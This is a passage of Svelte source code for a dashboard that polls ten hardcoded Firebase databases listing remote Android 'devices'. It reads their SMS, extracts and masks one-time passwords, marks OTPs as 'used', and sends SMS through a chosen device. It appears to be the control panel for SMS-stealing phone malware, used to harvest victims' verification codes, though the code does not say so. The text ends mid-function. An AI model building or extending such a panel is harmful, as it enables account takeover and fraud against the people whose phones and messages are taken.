<script>
  // ── Svelte action: drag-to-scroll ────────────────────────────────────────
  function dragScroll(node) {
    let isDown = false, startY = 0, scrollTop = 0;
    const onDown = e => { isDown = true; startY = (e.touches?.[0]?.clientY ?? e.clientY); scrollTop = node.scrollTop; node.style.cursor = 'grabbing'; };
    const onMove = e => { if (!isDown) return; const y = (e.touches?.[0]?.clientY ?? e.clientY); node.scrollTop = scrollTop - (y - startY); };
    const onUp   = () => { isDown = false; node.style.cursor = ''; };
    node.addEventListener('mousedown',  onDown);
    node.addEventListener('touchstart', onDown, { passive: true });
    window.addEventListener('mousemove', onMove);
    window.addEventListener('touchmove', onMove, { passive: true });
    window.addEventListener('mouseup',   onUp);
    window.addEventListener('touchend',  onUp);
    return { destroy() {
      node.removeEventListener('mousedown',  onDown);
      node.removeEventListener('touchstart', onDown);
      window.removeEventListener('mousemove', onMove);
      window.removeEventListener('touchmove', onMove);
      window.removeEventListener('mouseup',   onUp);
      window.removeEventListener('touchend',  onUp);
    }};
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function isOnline(info) {
    if (!info || typeof info !== 'object') return null;
    const s = info.status ?? info.connectionStatus ?? info.isOnline ?? info.online;
    if (s === true || s === 'online' || s === 'connected') return true;
    if (s === false || s === 'offline' || s === 'disconnected') return false;
    // If lastSeen within 3 min, consider online
    const ls = Number(info.lastSeen ?? info.lastMessageTime ?? 0);
    if (ls > 0) return (Date.now() - ls) < 180_000;
    return null;
  }
  function getBattery(info) {
    if (!info) return null;
    const b = info.battery ?? info.batteryLevel ?? info.bat;
    const n = parseInt(b);
    return isNaN(n) ? null : Math.min(100, Math.max(0, n));
  }
  function batColor(pct) {
    if (pct == null) return '#64748b';
    if (pct >= 60) return '#22c55e';
    if (pct >= 30) return '#fbbf24';
    return '#ef4444';
  }
  function getSims(info) {
    if (!info) return null;
    const s = info.simCount ?? info.sims ?? info.numSims;
    const n = parseInt(s);
    return isNaN(n) ? null : n;
  }
  function fmtPhone(info) {
    if (!info) return '';
    const p = info.mobNo ?? info.phone ?? info.phoneNumber ?? info.mobile ?? info.number ?? '';
    return String(p).trim();
  }
  function getIp(info) {
    if (!info) return null;
    return info.ip ?? info.ipAddress ?? info.localIp ?? null;
  }
  function getAndroid(info) {
    if (!info) return null;
    return info.androidVersion ?? info.android ?? info.osVersion ?? null;
  }

  // ── Clipboard helper ─────────────────────────────────────────────────────
  function copyText(txt) {
    const s = String(txt ?? '');
    if (!s) return;
    try { navigator.clipboard.writeText(s); } catch {
      const ta = document.createElement('textarea');
      ta.value = s; ta.style.cssText = 'position:fixed;opacity:0;top:-9999px';
      document.body.appendChild(ta); ta.select(); document.execCommand('copy');
      document.body.removeChild(ta);
    }
  }

  import '../app.css';
  import { onMount } from 'svelte';

  // ── Connections ──────────────────────────────────────────────────────────
  // path: where device keys live (root of messages)
  // infoPath: optional path for device info (status/battery). '' = not available
  let connections = $state([
    { id:'c0', name:'gunpawdar',   url:'https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app', token:'', path:'messages', infoPath:'clients', color:'#f97316', enabled:true },
    { id:'c1', name:'surajkiwife', url:'https://surajkiwife-9b0e2-default-rtdb.firebaseio.com',               token:'', path:'messages', infoPath:'clients', color:'#38bdf8', enabled:true },
    { id:'c2', name:'ranu',        url:'https://ranu-e604c-default-rtdb.firebaseio.com',                      token:'', path:'messages', infoPath:'clients', color:'#a78bfa', enabled:true },
    { id:'c3', name:'rambhai',     url:'https://rambhai-2c356-default-rtdb.firebaseio.com',                   token:'', path:'messages', infoPath:'clients', color:'#34d399', enabled:true },
    { id:'c4', name:'ramesh',      url:'https://ramesh-67a2b-default-rtdb.firebaseio.com',                    token:'', path:'messages', infoPath:'clients', color:'#fb7185', enabled:true },
    { id:'c5', name:'krisna574',   url:'https://krisna574-ffef3-default-rtdb.firebaseio.com',                 token:'', path:'messages', infoPath:'clients', color:'#fbbf24', enabled:true },
    { id:'c6', name:'navin',       url:'https://navin-9fb56-default-rtdb.firebaseio.com',                     token:'', path:'messages', infoPath:'clients', color:'#06b6d4', enabled:true },
    { id:'c7', name:'palms',       url:'https://palms-568c7-default-rtdb.firebaseio.com',                     token:'', path:'messages', infoPath:'clients', color:'#ec4899', enabled:true },
    { id:'c8', name:'rajkumar',    url:'https://rajkumar-a67fb-default-rtdb.firebaseio.com',                  token:'', path:'messages', infoPath:'clients', color:'#84cc16', enabled:true },
    { id:'c9', name:'newpanel',    url:'https://newpanel-4412c-default-rtdb.firebaseio.com',                  token:'', path:'messages', infoPath:'clients', color:'#c084fc', enabled:true },
  ]);
  let refreshInterval = $state(null);
  let lastRefresh     = $state(null);
  let nextRefreshSecs = $state(10);
  let addOpen = $state(false);
  let form    = $state({ name:'', url:'', token:'', path:'messages', infoPath:'clients' });
  const ACCENT = ['#f97316','#38bdf8','#a78bfa','#34d399','#fb7185','#fbbf24','#06b6d4','#ec4899'];

  // ── DB state ─────────────────────────────────────────────────────────────
  // db[connId] = { loading, error, keys:{devKey:true}, info:{devKey:{status,battery,phone}}, ts }
  let db = $state({});

  // ── Selection / tabs ─────────────────────────────────────────────────────
  let selectedConnId = $state(null);
  let selectedKey    = $state(null);
  let activeTab      = $state('overview');

  // ── Messages state ────────────────────────────────────────────────────────
  let msgs        = $state(null);   // { tsKey: {sender,message,type,dateTime} }
  let msgsLoading = $state(false);
  let msgsFilter  = $state('all');  // 'all' | 'in' | 'out'
  let msgsSearch  = $state('');

  // ── Send SMS ─────────────────────────────────────────────────────────────
  let smsDraft   = $state({ to:'', body:'', sim:'0' });
  let smsSending = $state(false);

  // ── Sidebar ───────────────────────────────────────────────────────────────
  let sideFilter  = $state('all');
  let searchQuery = $state('');
  let sideLimit   = $state(100);
  let sideOpen    = $state(false); // mobile sidebar drawer
  let sideTab     = $state('firebase'); // 'firebase' | 'devices'

  // ── Notifications ───────────────────────────────────────────────────────────
  let notifications   = $state([]);
  let prevLastMsgTime = {}; // non-reactive: {connId:{devKey:ts}}
  let notifExpanded   = $state(false);  // show all vs 2 newest
  let showBellPanel   = $state(false);  // floating bell dropdown open
  let expandedNotifs  = $state(new Set()); // IDs of expanded cards
  let notifSeen       = new Set();      // non-reactive: 'connId::devKey::msgId' dedupe

  // ── Dashboard table filters (multi-select AND logic) ─────────────────────
  let tableActiveFilters = $state(new Set()); // Set of 'on'|'off'|'num'|'used'|'new'
  let tableSearch        = $state('');
  let tableConnFilter    = $state(null);      // null = all FBs, or a connId
  let newDeviceKeys      = $state(new Set()); // 'connId::key' seen after first load
  const baselineDeviceKeys = new Set();       // non-reactive: keys at first load

  // ── Mobile bottom nav ─────────────────────────────────────────────────────
  let activeBottomTab = $state('dashboard'); // 'dashboard'|'devices'|'notifs'|'send'|'settings'

  function setBottomTab(tab) {
    activeBottomTab = tab;
    if (tab === 'dashboard') {
      activeTab = 'overview';
      sideOpen = false;
      showBellPanel = false;
    } else if (tab === 'devices') {
      sideOpen = !sideOpen;
      if (sideOpen) sideTab = 'devices';
      showBellPanel = false;
    } else if (tab === 'notifs') {
      showBellPanel = !showBellPanel;
      sideOpen = false;
    } else if (tab === 'send') {
      if (selectedKey) {
        activeTab = 'send';
      } else {
        toast('Select a device first to send SMS', 'info');
        sideOpen = true;
        sideTab = 'devices';
      }
      showBellPanel = false;
    } else if (tab === 'settings') {
      addOpen = !addOpen;
      sideOpen = false;
      showBellPanel = false;
    }
  }

  // ── Dashboard pagination ───────────────────────────────────────────────────
  const DEVICES_PER_PAGE = 20;
  let devicePage = $state(0);
  let dtScrollEl = $state(null);
  let tabBodyEl = $state(null);

  function setDevicePage(p) {
    devicePage = p;
    if (dtScrollEl) {
      dtScrollEl.scrollTo({ top: 0, behavior: "smooth" });
    }
  }

  $effect(() => {
    // Reset to first page whenever filters or search change
    tableActiveFilters;
    tableConnFilter;
    tableSearch;
    setDevicePage(0);
  });

  // ── Notification panel drag (mouse + touch via pointer events) ────────────
  let notifPanelPos  = $state({ x: 0, y: 0 });   // offset from default anchor
  let _ndDragging    = $state(false);
  let _ndStart       = { cx: 0, cy: 0, px: 0, py: 0 };

  function notifPanelDragStart(e) {
    if (e.button !== undefined && e.button !== 0) return; // left click only
    _ndDragging = true;
    const cx = e.clientX ?? (e.touches?.[0]?.clientX ?? 0);
    const cy = e.clientY ?? (e.touches?.[0]?.clientY ?? 0);
    _ndStart = { cx, cy, px: notifPanelPos.x, py: notifPanelPos.y };
    e.currentTarget.setPointerCapture?.(e.pointerId);
    e.preventDefault();
  }
  function notifPanelDragMove(e) {
    if (!_ndDragging) return;
    const cx = e.clientX ?? (e.touches?.[0]?.clientX ?? 0);
    const cy = e.clientY ?? (e.touches?.[0]?.clientY ?? 0);
    notifPanelPos = {
      x: _ndStart.px + (cx - _ndStart.cx),
      y: _ndStart.py + (cy - _ndStart.cy)
    };
  }
  function notifPanelDragEnd() { _ndDragging = false; }


  // ── Raw ──────────────────────────────────────────────────────────────────
  let rawOpen    = $state(false);
  let rawConnId  = $state('c0');
  let rawMethod  = $state('GET');
  let rawPath    = $state('');
  let rawBody    = $state('{\n  \n}');
  let rawRes     = $state(null);
  let rawLoading = $state(false);

  // ── Used OTPs & Local Phones (localStorage, device-local) ────────────────
  let usedSet     = $state(new Set());     // Set of message IDs marked used
  let localPhones = $state({});            // {'connId::devKey': 'phoneStr'}
  let editingPhone = $state(null);         // {connId, key} when editing
  let editPhoneVal = $state('');
  let notifsEnabled   = $state(true);       // global mute toggle
  let showNotifsTab   = $state(true);       // show/hide notifications tab in bottom nav
  let autoOpenNotif   = $state(false);      // auto-open panel when new OTP arrives (default OFF)
  let deletedDevices  = $state(new Set()); // 'connId::devKey' permanently removed
  let bgRefreshing    = $state(false);     // silent background refresh in progress

  // ── Toasts ───────────────────────────────────────────────────────────────
  let toasts = $state([]);
  function toast(msg, type='info') {
    const id = Date.now() + Math.random();
    toasts = [...toasts, { id, msg, type }];
    setTimeout(() => {
      toasts = toasts.map(t => t.id===id ? {...t,out:true} : t);
      setTimeout(() => toasts = toasts.filter(t => t.id!==id), 400);
    }, 3500);
  }

  // ── OTP helpers ───────────────────────────────────────────────────────────
  // Mask OTP: show first 2 digits + dots, copy always uses the real value
  function maskOTP(otp) {
    if (!otp || otp.length <= 2) return otp ?? '';
    return otp.slice(0, 2) + '•'.repeat(otp.length - 2);
  }

  // IST 12-hour format (Asia/Kolkata)
  function toIST(val) {
    try {
      const d = val instanceof Date ? val : new Date(typeof val === 'number' ? val : String(val));
      if (isNaN(d)) return String(val ?? '');
      return d.toLocaleString('en-IN', {
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: true, timeZone: 'Asia/Kolkata'
      });
    } catch { return String(val ?? ''); }
  }

  function extractOTP(text) {
    if (!text) return null;
    const nums = String(text).match(/\b(\d{4,8})\b/g);
    if (!nums) return null;
    return nums.find(m => m.length === 6) ||
           nums.find(m => m.length === 4) ||
           nums.find(m => m.length === 8) ||
           nums.find(m => m.length === 5) ||
           nums.find(m => m.length === 7) || null;
  }

  // Detect OTP / verification messages (only these trigger notifications)
  function isVerificationMsg(text) {
    if (!text) return false;
    const t = String(text).toLowerCase();
    return /\botp\b|verif|one.?time|\bcode\b|\btoken\b|\bpin\b|passcode|authoriz|\bconfirm\b|\bsecret\b/.test(t);
  }

  // Extract service name from sender ID (TX-SWIGGY-S → Swiggy) or message
  function extractAbout(sender, text) {
    const sm = String(sender||'').match(/^(?:[A-Z]{1,3}-)?([A-Z][A-Z0-9]{2,14})(?:-[A-Z])?$/);
    if (sm) { const s = sm[1]; return s.charAt(0) + s.slice(1).toLowerCase(); }
    const tm = String(text||'').match(/(?:log(?:ging)?\s+(?:in)?to|for|verify|from)\s+(?:your\s+)?([A-Za-z][A-Za-z0-9]{2,14})/i);
    if (tm) return tm[1];
    return null;
  }

  // ── Notification system ───────────────────────────────────────────────────
  const notifTimers = new Map(); // id → timeoutId so we can cancel on clear

  function addNotif(n) {
    if (!notifsEnabled) return;
    // ── Deduplication: skip if we've already seen this exact message ──
    const seenKey = `${n.connId}::${n.devKey}::${n.msgId ?? ''}`;
    if (n.msgId && notifSeen.has(seenKey)) return;
    if (n.msgId) {
      notifSeen.add(seenKey);
      // persist seen keys (keep last 500)
      try {
        const arr = [...notifSeen];
        if (arr.length > 500) arr.splice(0, arr.length - 500);
        localStorage.setItem('pd_notif_seen', JSON.stringify(arr));
      } catch {}
    }
    const id = Date.now() + Math.random();
    notifications = [{ id, ...n, ts: new Date() }, ...notifications].slice(0, 8);
    const t = setTimeout(() => {
      notifTimers.delete(id);
      notifications = notifications.map(x => x.id===id ? {...x, leaving:true} : x);
      setTimeout(() => notifications = notifications.filter(x => x.id!==id), 350);
    }, 30000);
    notifTimers.set(id, t);
    // Notification panel stays closed by default — only auto-opens if user explicitly turned it ON in settings
    if (autoOpenNotif) {
      showBellPanel = true;
    }
  }

  function dismissNotif(id) {
    if (notifTimers.has(id)) { clearTimeout(notifTimers.get(id)); notifTimers.delete(id); }
    notifications = notifications.map(n => n.id===id ? {...n, leaving:true} : n);
    setTimeout(() => notifications = notifications.filter(n => n.id!==id), 350);
  }

  function clearAllNotifs() {
    notifTimers.forEach(t => clearTimeout(t));
    notifTimers.clear();
    notifications = [];
    notifExpanded = false;
  }

  function clearAllNotifsConfirm() {
    if (confirm(`Clear all ${notifications.length} notification${notifications.length===1?'':'s'}?`)) {
      clearAllNotifs();
    }
  }

  function navigateToDevice(connId, devKey) {
    selectDevice(connId, devKey);
    showBellPanel = false; // close bell panel after navigating
  }

  function toggleNotifsEnabled() {
    notifsEnabled = !notifsEnabled;
    try { localStorage.setItem('pd_notifs_on', String(notifsEnabled)); } catch {}
    if (!notifsEnabled) clearAllNotifs();
  }

  function toggleShowNotifsTab() {
    showNotifsTab = !showNotifsTab;
    try { localStorage.setItem('pd_show_notifs_tab', String(showNotifsTab)); } catch {}
  }

  function toggleAutoOpenNotif() {
    autoOpenNotif = !autoOpenNotif;
    try { localStorage.setItem('pd_auto_open_notif', String(autoOpenNotif)); } catch {}
  }

  // ── Deleted devices (localStorage) ────────────────────────────────────────
  function isDeleted(connId, key) { return deletedDevices.has(`${connId}::${key}`); }
  function markDeleted(connId, key) {
    const next = new Set(deletedDevices);
    next.add(`${connId}::${key}`);
    deletedDevices = next;
    try { localStorage.setItem('pd_deleted', JSON.stringify([...next])); } catch {}
  }

  // ── Save connections to localStorage ───────────────────────────────────────
  function saveConnections(conns) {
    try { localStorage.setItem('pd_connections', JSON.stringify(conns)); } catch {}
  }

  // ── Used OTP tracking (localStorage) ─────────────────────────────────────
  function isUsed(id) { return usedSet.has(String(id)); }
  function toggleUsed(id) {
    const k = String(id);
    const next = new Set(usedSet);
    next.has(k) ? next.delete(k) : next.add(k);
    usedSet = next;
    try { localStorage.setItem('pd_used', JSON.stringify([...next])); } catch {}
  }

  // ── Local phone numbers (localStorage, per device) ────────────────────────
  function getLocalPhone(connId, key) { return localPhones[`${connId}::${key}`] ?? null; }
  function saveLocalPhone(connId, key, phone) {
    const p = phone.trim();
    const up = { ...localPhones };
    if (p) up[`${connId}::${key}`] = p;
    else delete up[`${connId}::${key}`];
    localPhones = up;
    try { localStorage.setItem('pd_phones', JSON.stringify(up)); } catch {}
  }
  function startEditPhone(connId, key) {
    editingPhone = { connId, key };
    editPhoneVal = getLocalPhone(connId, key) ?? '';
  }
  function commitPhone() {
    if (editingPhone) { saveLocalPhone(editingPhone.connId, editingPhone.key, editPhoneVal); }
    editingPhone = null; editPhoneVal = '';
  }

  // ── Display phone: local override → Firebase mobNo → fallback ────────────
  // Strip carrier name + country code → bare 10-digit number
  function extractNumber(phoneStr) {
    if (!phoneStr) return '';
    const digits = String(phoneStr).replace(/\D/g, ''); // remove all non-digits
    return digits.length >= 10 ? digits.slice(-10) : digits;
  }

  function getDisplayPhone(connId, key, info) {
    return getLocalPhone(connId, key) ?? fmtPhone(info);
  }

  // ── Fetch latest message for notification (OTP/verification only) ──────────
  async function fetchLatestMsg(conn, devKey) {
    try {
      const { data } = await apiFetch(conn, `${conn.path}/${devKey}`, 'GET', undefined,
        { orderBy: '"$key"', limitToLast: '1' });
      if (!data || typeof data !== 'object') return;
      const msg = Object.values(data)[0];
      if (!msg || typeof msg !== 'object') return;
      const text   = msg.message ?? msg.body ?? msg.text ?? '';
      const otp    = extractOTP(text);
      // Only notify for OTP / verification messages
      if (!otp && !isVerificationMsg(text)) return;
      const sender = msg.sender ?? msg.from ?? '?';
      addNotif({
        connId: conn.id, conn, devKey,
        sender, message: text, otp,
        about:  extractAbout(sender, text),
        msgId:  Object.keys(data)[0]
      });
    } catch {}
  }

  // ── API ───────────────────────────────────────────────────────────────────
  function buildUrl(conn, path, params={}) {
    const base = conn.url.replace(/\/+$/,'');
    const p    = String(path ?? conn.path).replace(/^\/+|\/+$/g,'');
    let u = `${base}/${p}.json`;
    const q = [];
    if (conn.token?.trim()) q.push(`auth=${encodeURIComponent(conn.token.trim())}`);
    Object.entries(params).forEach(([k,v]) => q.push(`${k}=${encodeURIComponent(v)}`));
    if (q.length) u += '?' + q.join('&');
    return u;
  }
  async function apiFetch(conn, path, method='GET', body, params={}) {
    const opts = { method, headers:{'Content-Type':'application/json'} };
    if (body !== undefined) opts.body = JSON.stringify(body);
    const res  = await fetch(buildUrl(conn, path, params), opts);
    const json = await res.json();
    if (!res.ok) throw new Error(json?.error ?? `${res.status}`);
    return { status:res.status, data:json };
  }

  // ── Fetch: shallow key list + device info ─────────────────────────────────
  async function fetchConn(conn, silent=false) {
    if (!conn.enabled) return;
    // Silent = keep existing data visible while fetching; only show loading on first fetch
    const hasData = db[conn.id]?.keys && Object.keys(db[conn.id].keys).length > 0;
    if (!silent || !hasData) {
      db = { ...db, [conn.id]: { ...db[conn.id], loading:true, error:null } };
    }
    try {
      // 1. Get all device keys (shallow, instant)
      const { data: keysData } = await apiFetch(conn, conn.path, 'GET', undefined, { shallow:'true' });
      const keys = keysData && typeof keysData==='object' ? keysData : {};

      // 2. Get device info (status/battery/phone) from infoPath if available
      let info = db[conn.id]?.info ?? {};
      const prevInfo = db[conn.id]?.info ?? {}; // snapshot before update
      if (conn.infoPath) {
        try {
          const { data: infoData } = await apiFetch(conn, conn.infoPath);
          if (infoData && typeof infoData==='object') {
            info = infoData;
            // ── Detect new messages via lastMessageTime ───────────────────
            for (const [devKey, devInfo] of Object.entries(infoData)) {
              if (!devInfo || typeof devInfo !== 'object') continue;
              const newTs = Number(devInfo.lastMessageTime ?? 0);
              const prevTs = Number(prevInfo[devKey]?.lastMessageTime ?? 0);
              if (newTs && prevTs && newTs > prevTs) {
                fetchLatestMsg(conn, devKey); // fire-and-forget
              }
            }
          }
        } catch {}
      }

      // Detect new device keys (not present at baseline / first load)
      const prevKeys = new Set(Object.keys(db[conn.id]?.keys ?? {}));
      for (const k of Object.keys(keys)) {
        const uid = `${conn.id}::${k}`;
        if (baselineDeviceKeys.size > 0 && !baselineDeviceKeys.has(uid)) {
          newDeviceKeys = new Set([...newDeviceKeys, uid]);
        }
      }

      db = { ...db, [conn.id]: { loading:false, error:null, keys, info, ts:new Date() } };
    } catch(e) {
      db = { ...db, [conn.id]: { ...db[conn.id], loading:false, error:e.message, ts:new Date() } };
      if (!silent) toast(`[${conn.name}] ${e.message}`, 'error');
    }
  }

  async function fetchAll(silent=false) {
    bgRefreshing = true;
    await Promise.allSettled(connections.filter(c=>c.enabled).map(c=>fetchConn(c, silent)));
    bgRefreshing = false;
    lastRefresh = new Date();
    nextRefreshSecs = 10;
    // After first load, capture baseline device keys so subsequent fetches can detect "new"
    if (!silent && baselineDeviceKeys.size === 0) {
      for (const c of connections) {
        for (const k of Object.keys(db[c.id]?.keys ?? {})) {
          baselineDeviceKeys.add(`${c.id}::${k}`);
        }
      }
    }
  }

  onMount(() => {
    // ── Restore ALL localStorage state ──────────────────────────────────────
    try { usedSet = new Set(JSON.parse(localStorage.getItem('pd_used') || '[]')); } catch {}
    try { localPhones = JSON.parse(localStorage.getItem('pd_phones') || '{}'); } catch {}
    try { deletedDevices = new Set(JSON.parse(localStorage.getItem('pd_deleted') || '[]')); } catch {}
    try { notifsEnabled = localStorage.getItem('pd_notifs_on') !== 'false'; } catch {}
    try { showNotifsTab = localStorage.getItem('pd_show_notifs_tab') !== 'false'; } catch {}
    try { autoOpenNotif = localStorage.getItem('pd_auto_open_notif') === 'true'; } catch {}
    // Restore seen notification IDs so refresh doesn't re-trigger same messages
    try { notifSeen = new Set(JSON.parse(localStorage.getItem('pd_notif_seen') || '[]')); } catch {}
    // Restore persisted connections (merge over defaults — user additions win)
    try {
      const saved = JSON.parse(localStorage.getItem('pd_connections') || 'null');
      if (Array.isArray(saved) && saved.length) {
        // Merge: keep hardcoded defaults by id, append any extra user-added ones
        const defaultIds = new Set(connections.map(c => c.id));
        const extras = saved.filter(c => !defaultIds.has(c.id));
        // Also restore enabled state from saved for existing connections
        connections = connections.map(c => {
          const s = saved.find(x => x.id === c.id);
          return s ? { ...c, enabled: s.enabled } : c;
        }).concat(extras);
      }
    } catch {}

    fetchAll(false);  // first load: show loading state
    refreshInterval = setInterval(() => fetchAll(true), 10_000);  // bg silent auto-refresh every 10s
    const ticker = setInterval(() => {
      nextRefreshSecs = nextRefreshSecs > 0 ? nextRefreshSecs - 1 : 0;
    }, 1000);
    return () => { clearInterval(refreshInterval); clearInterval(ticker); };
  });

  // ── Connection management ─────────────────────────────────────────────────
  function addConn() {
    const rawUrl = form.url.trim().replace(/\/+$/,'');
    if (!rawUrl) { toast('Firebase URL required','error'); return; }
    const dup = connections.find(c => c.url.replace(/\/+$/,'') === rawUrl);
    if (dup) { toast(`Already connected as "${dup.name}" — refreshing`,'info'); fetchConn(dup); addOpen=false; return; }
    const id    = `c${Date.now()}`;
    const color = ACCENT[connections.length % ACCENT.length];
    let name = form.name.trim();
    try { if (!name) name = new URL(rawUrl).hostname.split('-')[0]; } catch {}
    const conn = { ...form, url:rawUrl, id, color, name:name||'Firebase', enabled:true };
    connections = [...connections, conn];
    saveConnections(connections);  // persist immediately
    rawConnId = id;
    form = { name:'', url:'', token:'', path:'messages', infoPath:'' };
    addOpen = false;
    fetchConn(conn);
    toast(`Connected: ${conn.name}`, 'success');
  }
  function toggleConn(id) {
    connections = connections.map(c => c.id===id ? {...c,enabled:!c.enabled} : c);
    saveConnections(connections);  // persist enabled state
    const conn = connections.find(c => c.id===id);
    if (conn?.enabled) fetchConn(conn);
  }
  function dropConn(id) {
    if (!confirm('Remove connection?')) return;
    connections = connections.filter(c => c.id!==id);
    saveConnections(connections);  // persist removal
    const {[id]:_, ...rest} = db; db = rest;
  }

  // ── Select device ─────────────────────────────────────────────────────────
  function selectDevice(connId, key) {
    selectedConnId = connId; selectedKey = key;
    msgs = null; msgsFilter='all'; msgsSearch='';
    activeTab = 'device';
    sideOpen = false; // close sidebar on mobile after selecting a device
  }

  // ── Load Messages (all SMS for selected device) ───────────────────────────
  async function loadMessages() {
    const conn = connections.find(c => c.id===selectedConnId);
    if (!conn || !selectedKey) return;
    msgsLoading = true; msgs = null;
    try {
      // Fetch only last 50 messages, newest first
      const { data } = await apiFetch(conn, `${conn.path}/${selectedKey}`, 'GET', undefined,
        { orderBy: '"$key"', limitToLast: '50' });
      msgs = data && typeof data==='object' ? data : {};
    } catch(e) { toast(e.message, 'error'); msgs = {}; }
    finally { msgsLoading = false; }
  }

  // ── Send SMS ─────────────────────────────────────────────────────────────
  // Confirmed from network log:
  //   PUT clients/<deviceKey>/webhookEvent/sendSms.json?auth=<dbUrl>
  //   Body: { from:1, to:"9885124921", message:"...", isSended:false }
  async function doSendSMS() {
    const conn = connections.find(c => c.id===selectedConnId);
    if (!conn || !selectedKey) return;
    const raw = smsDraft.to.trim();
    const to  = raw.replace(/\D/g,'');   // digits only (gateway expects no +91 prefix)
    const message = smsDraft.body.trim();
    if (!to || !message) { toast('Enter phone number and message','error'); return; }
    smsSending = true;
    try {
      const base = conn.url.replace(/\/+$/, '');
      const authParam = encodeURIComponent(conn.url);
      const url = `${base}/clients/${selectedKey}/webhookEvent/sendSms.json?auth=${authParam}`;
      const payload = { from: parseInt(smsDraft.sim) + 1, to, message, isSended: false };
      console.log('[SendSMS] PUT', url, payload);
      const res  = await fetch(url, { method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
      const json = await res.json().catch(()=>({}));
      if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
      toast('SMS sent ✓','success');
      smsDraft = { to:'', body:'', sim:'0' };
    } catch(e) {
      console.error('[SendSMS] failed:', e);
      toast(`Send failed: ${e.message}`,'error');
    } finally { smsSending = false; }
  }

  // ── Delete device key ─────────────────────────────────────────────────────
  async function deleteDevice(conn, key) {
    if (!confirm(`Delete all messages for "${key}" from ${conn.name}?`)) return;
    try {
      await apiFetch(conn, `${conn.path}/${key}`, 'DELETE');
      markDeleted(conn.id, key);  // persist locally so it stays gone after refresh
      toast(`Deleted "${key}"`, 'success');
      if (selectedKey===key && selectedConnId===conn.id) { selectedKey=null; selectedConnId=null; activeTab='overview'; }
      fetchConn(conn);
    } catch(e) { toast(e.message,'error'); }
  }

  // ── Raw ──────────────────────────────────────────────────────────────────
  async function sendRaw() {
    const conn = connections.find(c => c.id===rawConnId);
    if (!conn) return;
    rawLoading=true; rawRes=null;
    try {
      const opts = { method:rawMethod, headers:{'Content-Type':'application/json'} };
      if (['POST','PUT','PATCH'].includes(rawMethod)) opts.body = rawBody;
      const res  = await fetch(buildUrl(conn, rawPath||conn.path), opts);
      const json = await res.json();
      rawRes = { status:res.status, ok:res.ok, data:json };
      if (res.ok) { toast(`${rawMethod} → ${res.status}`,'success'); fetchConn(conn); }
      else toast(`Error ${res.status}`,'error');
    } catch(e) { rawRes={error:e.message}; toast(e.message,'error'); }
    finally { rawLoading=false; }
  }

  function switchTab(tab) {
    activeTab = tab;
    if (tab==='messages' && selectedKey) loadMessages();
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function getDevInfo(connId, key) {
    // Returns device info from infoPath if available
    return db[connId]?.info?.[key] ?? null;
  }
  function getLatestMsg(connId, key) {
    // Get count of messages from keys
    const entry = db[connId];
    return entry?.keys?.[key] === true ? Object.keys(entry.keys).length : 0;
  }

  // ── Derived ───────────────────────────────────────────────────────────────
  let allDevices = $derived((() => {
    const list = [];
    for (const conn of connections) {
      if (!conn.enabled) continue;
      const entry = db[conn.id];
      if (!entry?.keys || typeof entry.keys!=='object') continue;
      for (const key of Object.keys(entry.keys)) {
        if (typeof key !== 'string' || key.length < 4) continue;
        if (isDeleted(conn.id, key)) continue; // skip locally deleted devices
        const info = entry.info?.[key] ?? null;
        list.push({ connId:conn.id, conn, key, info });
      }
    }
    return list;
  })());

  // Message count per device is the number of children keys
  function getMsgCount(connId, key) {
    const entry = db[connId];
    if (!entry?.keys) return 0;
    // keys from shallow root are the device keys, count comes from the device's own shallow fetch
    return 0; // We don't pre-load message counts; too expensive
  }

    // ── Unified search matching (device key, local added phone, Firebase phone, connection name, info) ──
  function matchDeviceSearch(d, query) {
    if (!query) return true;
    const q = query.toLowerCase().trim();
    if (!q) return true;
    // 1. Match device key / ID
    if (d.key.toLowerCase().includes(q)) return true;
    // 2. Match phone number (both local added phone number and Firebase phone)
    const phone = getDisplayPhone(d.connId, d.key, d.info);
    if (phone) {
      if (phone.toLowerCase().includes(q)) return true;
      const cleanPhone = phone.replace(/\D/g, "");
      const cleanQ = q.replace(/\D/g, "");
      if (cleanQ.length > 0) {
        if (cleanPhone.includes(cleanQ)) return true;
        const q10 = cleanQ.length >= 10 ? cleanQ.slice(-10) : null;
        const p10 = cleanPhone.length >= 10 ? cleanPhone.slice(-10) : null;
        if (q10 && cleanPhone.includes(q10)) return true;
        if (p10 && cleanQ.includes(p10)) return true;
      }
    }
    // Check original Firebase phone if overridden by local number
    const rawFmt = fmtPhone(d.info);
    if (rawFmt && rawFmt !== phone) {
      if (rawFmt.toLowerCase().includes(q)) return true;
      const cleanRaw = rawFmt.replace(/\D/g, "");
      const cleanQ = q.replace(/\D/g, "");
      if (cleanQ.length > 0) {
        if (cleanRaw.includes(cleanQ)) return true;
        const q10 = cleanQ.length >= 10 ? cleanQ.slice(-10) : null;
        const p10 = cleanRaw.length >= 10 ? cleanRaw.slice(-10) : null;
        if (q10 && cleanRaw.includes(q10)) return true;
        if (p10 && cleanQ.includes(p10)) return true;
      }
    }
    // 3. Match Firebase connection name
    if (d.conn?.name?.toLowerCase().includes(q)) return true;
    // 4. Match Firebase info JSON (model, ip, etc.)
    if (d.info && JSON.stringify(d.info).toLowerCase().includes(q)) return true;
    return false;
  }

  let filteredSide = $derived(allDevices.filter(d => {
    if (searchQuery && !matchDeviceSearch(d, searchQuery)) return false;
    const on = d.info ? isOnline(d.info) : null;
    if (sideFilter==='on'   && on !== true)  return false;
    if (sideFilter==='off'  && on === true)  return false;
    if (sideFilter==='num'  && !getDisplayPhone(d.connId, d.key, d.info)) return false;
    if (sideFilter==='used' && !isUsed(`dev::${d.connId}::${d.key}`)) return false;
    return true;
  }));

  let totalCount      = $derived(allDevices.length);
  let onlineCount     = $derived(allDevices.filter(d => d.info && isOnline(d.info)).length);
  let offlineCount    = $derived(allDevices.filter(d => !d.info || isOnline(d.info) !== true).length);
  let numCount        = $derived(allDevices.filter(d => getDisplayPhone(d.connId, d.key, d.info)).length);
  let onlineNumCount  = $derived(allDevices.filter(d => d.info && isOnline(d.info) && getDisplayPhone(d.connId, d.key, d.info)).length);
  let newCount        = $derived(newDeviceKeys.size);

  // Filtered device list — AND logic across all active filters
  let filteredTableDevices = $derived(allDevices.filter(d => {
    if (tableSearch && !matchDeviceSearch(d, tableSearch)) return false;
